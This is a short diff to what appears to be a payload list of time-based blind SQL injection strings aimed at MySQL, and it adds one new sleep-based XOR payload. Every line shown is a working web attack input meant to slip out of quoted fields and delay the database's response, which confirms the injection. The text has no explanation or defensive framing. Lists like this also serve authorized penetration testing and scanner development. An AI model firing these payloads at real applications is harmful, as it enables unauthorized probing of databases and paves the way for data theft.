@@ -1,5 +1,6 @@
 0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
 0'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
+'XOR(SELECT(0)FROM(SELECT(SLEEP(9)))a)XOR'Z
 if(now()=sysdate(),sleep(5),0)
 'XOR(if(now()=sysdate(),sleep(5),0))XOR'
 'XOR(if(now()=sysdate(),sleep(5*1),0))OR'
